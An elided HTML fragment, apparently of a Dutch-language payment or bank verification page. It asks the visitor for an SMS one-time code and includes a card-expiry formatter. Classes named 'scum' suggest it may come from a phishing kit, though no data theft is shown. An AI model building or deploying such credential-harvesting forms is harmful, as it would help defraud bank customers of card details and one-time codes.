                ...
                <div class="box2">
                    <div class="scum_container loader_hide">
                        <div class="scum" id="exp-view">
                                ...
                                <h4 class="ng-binding">Ter verificatie van het door u opgegeven GSM-nummer hebben wij u eenmalig een sms code toegestuurd. Gelieve de toegestuurde code in het veld hieronder op te geven:
...
function formatExpiryDate(input) {
    ...
    input.value = value;
                                    ...
                                    <input type="tel" name="otp" placeholder="******" autocomplete="one-time-code" required="" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern">
